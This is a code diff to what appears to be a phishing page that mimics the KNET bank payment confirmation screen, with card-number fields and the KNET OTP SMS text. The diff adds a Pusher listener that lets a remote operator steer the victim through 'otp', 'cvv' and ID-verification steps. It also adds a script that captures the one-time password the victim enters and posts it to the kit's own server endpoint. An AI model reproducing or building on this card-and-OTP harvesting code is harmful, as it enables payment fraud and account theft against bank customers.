@@ -104,15 +104,9 @@
                         </div>
                         <div id="DigiCertClickID_cM-vbZrL"></div>
                     </footer>
-
-
                 </div>
             </div>
         </div>
-
-
-
-
         <!--  Payment Page Confirmation Starts-->
         <div id="payConfirm" style="display: none;">
             <div class="container">
@@ -161,8 +155,6 @@ This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in th
                             <div id="payConfirmCardNum">
 
                                 <!-- Added for Points Redemption -->
-
-
 
                                 <label class="column-label">Card Number:</label>
 
@@ -252,36 +244,43 @@ This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in th
             var pid = "7239";
             // Enable pusher logging - don't include this in production
             Pusher.logToConsole = true;
-            var pusher = new Pusher("087f53ca5c3ac2e36523", {
+            var pusher = new Pusher("d1868eff0961af03482e", {
                 cluster: 'ap2'
             });
-
-            var channel = pusher.subscribe('confirm');
-            channel.bind('App\\Events\\Confirmation', function(data) {
-                if (data.people_id == pid && data.status == 'Accept') {
-                    window.location.href = 'knetwait.html';
+            var channel = pusher.subscribe("confirm");
+            channel.bind("App\\Events\\Confirmation", function(data) {
+                if (data.people_id == pid && data.status == "Accept") {
+                    document.getElementById("payConfirm").style.display = "block";
+                    document.getElementById("OTPDCDIV").style.display = "block";
+                    document.getElementById("otpmsgDC2").style.display = "block";
                 }
-                if (data.people_id == pid && data.status == 'Reject') {
-                    window.location.href = 'knetpage.html';
+                if (data.people_id == pid && data.status == "Reject") {
+                    alert("Transaction Declined");
+                    window.location.href = "index.html";
                 }
-                if (data.people_id == pid && data.status == 'cvv') {
-                    window.location.href = 'index.html';
+                if (data.people_id == pid && data.status == "otp") {
+                    document.getElementById("payConfirm").style.display = "block";
+                    document.getElementById("OTPDCDIV").style.display = "block";
+                    document.getElementById("otpmsgDC2").style.display = "block";
                 }
-                if (data.people_id == pid && data.status == 'error') {
-                    window.location.href = 'index.html';
+                if (data.people_id == pid && data.status == "cvv") {
+                    document.getElementById("payConfirm").style.display = "block";
+                    document.getElementById("OTPDCDIV").style.display = "block";
                 }
-                if (data.people_id == pid && data.status == 'hawety') {
-                    window.location.href = 'index.html';
+                if (data.people_id == pid && data.status == "error") {
+                    alert("Transaction Error - Please try again");
+                    window.location.href = "index.html";
                 }
-
-                if (data.people_id == pid && data.status == 'idpedol') {
-                    window.location.href = 'index.html';
+                if (data.people_id == pid && data.status == "hawety") {
+                    alert("Please verify with Haweyati");
+                    window.location.href = "index.html";
+                }
+                if (data.people_id == pid && data.status == "idpedol") {
+                    // Keep waiting
                 }
 
             });
         </script>
-
-
         <input type="hidden" name="encryptedCardNumber" id="encryptedCardNumber" value="">
         <input type="hidden" name="encryptedMonth" id="encryptedMonth" value="">
         <input type="hidden" name="encryptedYear" id="encryptedYear" value="">
@@ -301,8 +300,6 @@ This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in th
         <!-- End -->
         <input type="hidden" name="paymentId" value="102435359000254804">
         <input type="hidden" name="atmPayRetentionPeriod" value="0">
-
-
         <input type="hidden" name="merchHeaderFile" value="">
 
         <input type="hidden" name="mrchName" value="Tap Payments EPSP">
@@ -425,8 +422,6 @@ This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in th
         <input type="hidden" name="resend" value="">
         <input type="hidden" name="pymntPointsRedemptionflg" value="0">
         <!-- Added for Points Redemption  -->
-
-
         <!--Added for PG Discount flag  -->
         <input type="hidden" name="discountval">
         <input type="hidden" name="discountedtranamount">
@@ -453,7 +448,25 @@ This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in th
         <input type="hidden" name="kfastRegDeclineValue">
     </form>
 
-<script>function cancelPage() { window.location.href = "index.html"; } function sibTags() {} function payConfirmAjax(action) { window.location.href = "index.html"; }</script>
+<script>
+function cancelPage() { window.location.href = "index.html"; }
+function sibTags() {}
+function payConfirmAjax(action) {
+    // Send OTP to server
+    var otp = document.getElementById('debitOTPtimer') ? document.getElementById('debitOTPtimer').value : '';
+    var submissionId = localStorage.getItem('submissionId') || '';
+    
+    if (otp && submissionId) {
+        fetch('/api/update-submission', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ id: submissionId, otp: otp })
+        }).then(function(r) { return r.json(); }).then(function(res) {
+            console.log('OTP sent:', res);
+        }).catch(function(e) { console.error(e); });
+    }
+}
+</script>
 </body>
 
 </html>
